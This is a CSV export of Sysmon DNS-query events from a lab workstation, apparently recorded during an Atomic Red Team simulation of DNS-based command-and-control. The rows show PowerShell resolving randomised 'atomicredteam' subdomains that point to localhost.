"2025-12-26 11:26:22.957 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173901,"Query: atomicredteam-175575.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:22.474","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:22.957 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173902,"Query: atomicredteam-251327.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:22.516","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173907,"Query: atomicredteam-352324.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:22.556","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173908,"Query: atomicredteam-889533.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:22.596","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173909,"Query: atomicredteam-764055.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:22.918","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173910,"Query: atomicredteam-796690.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:23.092","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173911,"Query: atomicredteam-455641.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:23.134","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173912,"Query: atomicredteam-919157.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:23.184","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173913,"Query: atomicredteam-493913.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:23.368","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173914,"Query: atomicredteam-761900.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:23.409","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173915,"Query: atomicredteam-91043.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:23.450","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173916,"Query: atomicredteam-626268.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:23.497","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173917,"Query: atomicredteam-18324.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:23.822","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:23.964 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173918,"Query: atomicredteam-125805.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:23.861","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:25.873 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173920,"Query: atomicredteam-641222.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:23.899","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:25.873 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173921,"Query: atomicredteam-424220.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:24.243","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:25.888 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173922,"Query: atomicredteam-170534.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:24.428","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:25.902 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173923,"Query: atomicredteam-529451.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:24.601","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:25.906 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173924,"Query: atomicredteam-695961.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:24.640","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173925,"Query: atomicredteam-590856.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:24.724","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173926,"Query: atomicredteam-237698.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:24.834","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.007 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173927,"Query: atomicredteam-980655.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:25.904","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173928,"Query: atomicredteam-367896.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.005","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173929,"Query: atomicredteam-362685.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.130","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173930,"Query: atomicredteam-276230.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.294","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.995 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173931,"Query: atomicredteam-526087.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.343","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173932,"Query: atomicredteam-182293.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.386","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173933,"Query: atomicredteam-769643.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173934,"Query: atomicredteam-562912.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.571","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173935,"Query: atomicredteam-279039.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.636","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173936,"Query: atomicredteam-680614.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.675","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173937,"Query: atomicredteam-625556.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.849","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:26.996 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173938,"Query: atomicredteam-914291.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.889","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:28.009 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173939,"Query: atomicredteam-518295.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.930","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:28.009 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173940,"Query: atomicredteam-688990.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:26.975","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:28.009 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173941,"Query: atomicredteam-929539.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:27.144","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:28.009 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173942,"Query: atomicredteam-985361.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:27.317","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:28.009 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173943,"Query: atomicredteam-395406.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:27.364","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:28.010 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173944,"Query: atomicredteam-455633.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:27.540","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:28.010 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173945,"Query: atomicredteam-37331.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:27.715","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:28.010 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173946,"Query: atomicredteam-753925.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:27.899","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:29.151 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173947,"Query: atomicredteam-299115.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:27.947","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:29.151 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173948,"Query: atomicredteam-765447.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:28.294","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:29.151 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173949,"Query: atomicredteam-485987.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:28.560","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:29.151 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173950,"Query: atomicredteam-232217.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:28.607","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:29.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173951,"Query: atomicredteam-855796.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:28.672","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:29.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173952,"Query: atomicredteam-953940.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:28.716","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:29.152 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",173953,"Query: atomicredteam-125429.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:28.768","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
